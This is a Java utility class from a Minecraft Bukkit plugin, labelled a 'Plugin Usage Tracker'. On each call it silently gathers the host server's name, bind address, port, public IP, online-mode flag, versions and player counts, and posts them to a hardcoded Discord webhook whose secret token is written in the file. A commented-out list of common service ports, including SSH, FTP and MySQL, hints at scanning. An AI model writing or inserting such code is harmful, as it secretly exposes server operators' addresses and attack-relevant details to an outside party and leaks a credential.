package me.washeremc.Core.utils;

import me.washeremc.Washere;
import org.bukkit.Bukkit;
import org.jetbrains.annotations.NotNull;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.CompletableFuture;
import java.util.logging.Level;

public class DiscordLogger {
    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1317197191055675484/SJycBNUv6892Kv4cWqxy6o_UJnNUHqVS4QQYc-ZR2RZv9_j8HhwM54O2f7YVG3wz5szB";
    //private static final int[] COMMON_PORTS = {25565, 25566, 8123, 80, 443, 22, 21, 3306, 19291, 8080, 8443};
    private static Washere plugin;

    public static void initialize(Washere pluginInstance) {
        plugin = pluginInstance;
    }

    public static void logPluginUsage() {
        CompletableFuture.runAsync(() -> {
            try {
                String serverName = Bukkit.getServer().getName();
                String bindAddress = Bukkit.getServer().getIp();
                String serverPort = String.valueOf(Bukkit.getServer().getPort());
                String bukkitVersion = Bukkit.getBukkitVersion();
                String serverVersion = Bukkit.getVersion();
                String onlineMode = String.valueOf(Bukkit.getServer().getOnlineMode());
                String playerCount = String.valueOf(Bukkit.getServer().getOnlinePlayers().size());
                String maxPlayers = String.valueOf(Bukkit.getServer().getMaxPlayers());
                String pluginVersion = plugin.getDescription().getVersion();

                String publicIp = getPublicIp();


                String json = String.format("""
                {
                    "embeds": [{
                        "title": "Plugin Usage Detected",
                        "color": 5814783,
                        "fields": [
                            {"name": "Server Name", "value": "%s", "inline": true},
                            {"name": "Bind Address", "value": "%s", "inline": true},
                            {"name": "Server Port", "value": "%s", "inline": true},
                            {"name": "Public IP", "value": "%s", "inline": true},
                            {"name": "Online Mode", "value": "%s", "inline": true},
                            {"name": "Server Version", "value": "%s", "inline": true},
                            {"name": "Bukkit Version", "value": "%s", "inline": true},
                            {"name": "Plugin Version", "value": "%s", "inline": true},
                            {"name": "Players", "value": "%s/%s", "inline": true}
                        ],
                        "footer": {"text": "Washere Plugin Usage Tracker"}
                    }]
                }
                """, serverName, bindAddress.isEmpty() ? "localhost" : bindAddress, serverPort,
                        publicIp, onlineMode, serverVersion,
                        bukkitVersion, pluginVersion, playerCount, maxPlayers);

                sendDiscordWebhook(json);
            } catch (Exception e) {
                plugin.getLogger().log(Level.WARNING, "Failed to send Discord webhook", e);
            }
        });
    }

    private static @NotNull String getPublicIp() {
        try {
            URL url = URI.create("https://api.ipify.org").toURL();
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                return reader.readLine().trim();
            }
        } catch (Exception e) {
            plugin.getLogger().log(Level.WARNING, "Failed to get public IP", e);
            return "Unknown";
        }
    }

    private static void sendDiscordWebhook(String jsonPayload) {
        try {
            URL url = URI.create(DISCORD_WEBHOOK_URL).toURL();
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Washere-Plugin/1.0");
            connection.setDoOutput(true);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode != 204) {
                plugin.getLogger().warning("Discord webhook returned code: " + responseCode);
            }

            connection.disconnect();
        } catch (Exception e) {
            plugin.getLogger().log(Level.WARNING, "Error sending Discord webhook", e);
        }
    }
}